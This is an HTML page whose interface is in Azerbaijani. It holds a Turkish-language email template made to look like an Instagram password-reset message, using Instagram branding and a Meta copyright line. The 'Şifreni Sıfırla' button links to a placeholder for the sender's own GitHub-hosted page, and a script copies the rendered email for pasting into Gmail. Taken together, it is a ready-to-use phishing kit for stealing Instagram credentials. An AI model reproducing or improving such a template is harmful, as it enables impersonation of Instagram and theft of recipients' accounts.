<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mail Kopyala</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background: #fafafa; }
        .btn-copy {
            padding: 20px 40px; background: #0095f6; color: white;
            border: none; border-radius: 30px; font-size: 18px; font-weight: bold;
            cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        #mail-template { display: none; } /* Mail gizli qalır, sadəcə kopyalamaq üçündür */
    </style>
</head>
<body>

    <button class="btn-copy" onclick="copyMail()">Maili Kopyala</button>
    <p id="status"></p>

    <div id="mail-content">
        <div style="font-family: -apple-system, system-ui, sans-serif; background: #fff; border: 1px solid #dbdbdb; padding: 40px; text-align: center; max-width: 450px; margin: auto;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" width="100" style="margin-bottom: 30px;">
            <div style="text-align: left; color: #262626; font-size: 16px; line-height: 24px; margin-bottom: 30px;">
                Üzgünüz, kullanici, şifreni sıfırlamakta sorun yaşadığını duyduk.<br><br>
                Hesabına tekrar erişebilmek için aşağıdaki düğmeyi kullanabilirsin.
            </div>
            <a href="SENIN_GITHUB_LINKIN" style="display: inline-block; background: #0095f6; color: #ffffff !important; padding: 12px 24px; border-radius: 8px; text-decoration: none; font-weight: 600; margin-bottom: 30px;">Şifreni Sıfırla</a>
            <div style="text-align: left; color: #8e8e8e; font-size: 14px;">
                Eğer bu isteği sen yapmadıysan, bu e-postayı görmezden gelebilirsin.
            </div>
            <hr style="border: 0; border-top: 1px solid #dbdbdb; margin: 20px 0;">
            <div style="color: #8e8e8e; font-size: 12px;">© Instagram. Meta Platforms, Inc.</div>
        </div>
    </div>

    <script>
        function copyMail() {
            const range = document.createRange();
            range.selectNode(document.getElementById("mail-content"));
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            document.execCommand("copy");
            window.getSelection().removeAllRanges();
            
            document.getElementById("status").innerText = "Kopyalandı! İndi Gmail-ə girib yapışdır.";
            document.getElementById("status").style.color = "green";
        }
    </script>

</body>
</html>
